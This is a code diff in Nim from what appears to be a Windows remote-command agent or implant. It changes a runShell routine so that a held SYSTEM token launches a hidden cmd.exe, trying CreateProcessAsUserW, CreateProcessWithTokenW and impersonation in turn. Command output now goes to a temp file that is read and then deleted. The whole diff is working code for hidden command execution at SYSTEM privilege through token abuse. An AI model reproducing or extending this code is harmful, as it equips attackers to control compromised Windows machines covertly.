@@ -124,21 +124,13 @@ proc runShell*(cmd: string): string =
   try:
     when defined(windows):
       if gSystemToken != 0:
-        # Use an anonymous pipe and a primary-token launch.  The previous
-        # implementation redirected to C:\Users\Public\sb*.out, which could
-        # leave an empty file even when cmd.exe failed to start and concealed
-        # the actual CreateProcess error.
-        let shellArgs = "/d /c " & cmd & " 2>&1"
-        var sa: SECURITY_ATTRIBUTES
-        zeroMem(addr sa, sizeof(sa))
-        sa.nLength = DWORD(sizeof(sa)); sa.bInheritHandle = WINBOOL(1)
-        var hRead, hWrite: HANDLE
-        if CreatePipe(addr hRead, addr hWrite, addr sa, 0) == 0:
-          return "[error: CreatePipe " & $GetLastError() & "]"
-        if SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0) == 0:
-          let e = GetLastError()
-          discard CloseHandle(hRead); discard CloseHandle(hWrite)
-          return "[error: SetHandleInformation " & $e & "]"
+        # Redirect output via '>' in the command line instead of passing pipe
+        # handles through STARTF_USESTDHANDLES.  CreateProcessWithTokenW goes
+        # through seclogon which cannot always duplicate pipe handles across
+        # session boundaries, causing STATUS_DLL_INIT_FAILED in the child.
+        let outPath = "C:\\Windows\\Temp\\sbo" &
+          toHex(int64(GetCurrentProcessId()) xor int64(GetTickCount()), 16) & ".tmp"
+        let shellArgs = "/d /c " & cmd & " > \"" & outPath & "\" 2>&1"
 
         var hSelf: HANDLE
         if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,
@@ -151,11 +143,11 @@ proc runShell*(cmd: string): string =
         discard enablePriv(gSystemToken, "SeIncreaseQuotaPrivilege")
         discard enablePriv(gSystemToken, "SeAssignPrimaryTokenPrivilege")
 
+        # No STARTF_USESTDHANDLES — the child writes its own output file.
         var si: STARTUPINFOW; zeroMem(addr si, sizeof(si))
         si.cb = DWORD(sizeof(si))
-        si.dwFlags = DWORD(STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW)
+        si.dwFlags = DWORD(STARTF_USESHOWWINDOW)
         si.wShowWindow = WORD(SW_HIDE)
-        si.hStdInput = 0; si.hStdOutput = hWrite; si.hStdError = hWrite
         var pi: PROCESS_INFORMATION; zeroMem(addr pi, sizeof(pi))
         let appW = newWideCString("C:\\Windows\\System32\\cmd.exe")
         let cwdW = newWideCString("C:\\Windows\\System32")
@@ -168,7 +160,7 @@ proc runShell*(cmd: string): string =
         var impErr: DWORD = 0
         if procOk == 0:
           procOk = CreateProcessAsUserW(gSystemToken, appW, argsAsUserW, nil, nil,
-            WINBOOL(1), CREATE_NO_WINDOW, nil, cwdW, addr si, addr pi)
+            WINBOOL(0), CREATE_NO_WINDOW, nil, cwdW, addr si, addr pi)
           if procOk == 0: asUserErr = GetLastError()
         if procOk == 0:
           let impOk = ImpersonateLoggedOnUser(gSystemToken)
@@ -180,50 +172,17 @@ proc runShell*(cmd: string): string =
               CREATE_NO_WINDOW, nil, cwdW, addr si, addr pi)
             if procOk == 0: withTokenErr = GetLastError()
             discard RevertToSelf()
-        discard CloseHandle(hWrite)
         if procOk == 0:
-          discard CloseHandle(hRead)
           return "[error: SYSTEM shell launch; WithToken=" & $withTokenErr &
             "; AsUser=" & $asUserErr & "; Impersonate=" & $impErr & "]"
 
-        var output = ""
-        var buf: array[4096, char]
-        var timedOut = false
-        var exitCode: DWORD = DWORD(259) # STILL_ACTIVE
-        let started = GetTickCount()
-        while true:
-          var avail: DWORD = 0
-          if PeekNamedPipe(hRead, nil, 0, nil, addr avail, nil) != 0 and avail > 0:
-            var nRead: DWORD = 0
-            let want = min(avail, DWORD(buf.len))
-            if ReadFile(hRead, addr buf[0], want, addr nRead, nil) != 0 and nRead > 0:
-              let start = output.len
-              output.setLen(start + int(nRead))
-              copyMem(addr output[start], addr buf[0], int(nRead))
-              continue
-          if GetExitCodeProcess(pi.hProcess, addr exitCode) != 0 and exitCode != DWORD(259):
-            # Drain bytes already buffered after the child exits.
-            while true:
-              avail = 0
-              if PeekNamedPipe(hRead, nil, 0, nil, addr avail, nil) == 0 or avail == 0: break
-              var nRead: DWORD = 0
-              let want = min(avail, DWORD(buf.len))
-              if ReadFile(hRead, addr buf[0], want, addr nRead, nil) == 0 or nRead == 0: break
-              let start = output.len
-              output.setLen(start + int(nRead))
-              copyMem(addr output[start], addr buf[0], int(nRead))
-            break
-          if GetTickCount() - started >= DWORD(60000):
-            timedOut = true
-            discard TerminateProcess(pi.hProcess, 1)
-            break
-          Sleep(DWORD(10))
-        discard CloseHandle(hRead)
+        discard WaitForSingleObject(pi.hProcess, DWORD(60000))
         discard CloseHandle(pi.hProcess); discard CloseHandle(pi.hThread)
-        if timedOut and output.len == 0: return "[error: SYSTEM shell capture timed out]"
-        if output.len == 0:
-          return "[error: SYSTEM shell capture empty; exit=" & $exitCode &
-            "; WithToken=" & $withTokenErr & "; AsUser=" & $asUserErr & "]"
+
+        # Read the output file written by the child process.
+        var output = ""
+        try: output = readFile(outPath) except: discard
+        discard DeleteFileA(outPath)
         return output
       let (output, _) = execCmdEx("cmd.exe /s /c \"" & cmd & "\"")
       return output
@@ -1060,12 +1019,16 @@ when defined(windows):
       let appW = newWideCString(appPath)
       var argsW = newWideCString(childArgs)
       var argsAsUserW = newWideCString(childArgs)
-      procOk = CreateProcessWithTokenW(gSystemToken, 0, appW, argsW,
-        CREATE_NO_WINDOW, nil, newWideCString("C:\\Windows\\System32"), addr si, addr pi)
+      # Try CreateProcessAsUserW first: it does NOT go through seclogon, so
+      # it can inherit the pipe handles across sessions without getting
+      # STATUS_DLL_INIT_FAILED.  Fall back to CreateProcessWithTokenW if
+      # SeAssignPrimaryTokenPrivilege is unavailable.
+      procOk = CreateProcessAsUserW(gSystemToken, appW, argsAsUserW, nil, nil,
+        WINBOOL(1), CREATE_NO_WINDOW, nil, newWideCString("C:\\Windows\\System32"), addr si, addr pi)
       launchErr = if procOk != 0: 0 else: GetLastError()
       if procOk == 0:
-        procOk = CreateProcessAsUserW(gSystemToken, appW, argsAsUserW, nil, nil,
-          WINBOOL(1), CREATE_NO_WINDOW, nil, newWideCString("C:\\Windows\\System32"), addr si, addr pi)
+        procOk = CreateProcessWithTokenW(gSystemToken, 0, appW, argsW,
+          CREATE_NO_WINDOW, nil, newWideCString("C:\\Windows\\System32"), addr si, addr pi)
         if procOk == 0: launchErr = GetLastError()
       if procOk == 0:
         let impOk = ImpersonateLoggedOnUser(gSystemToken)
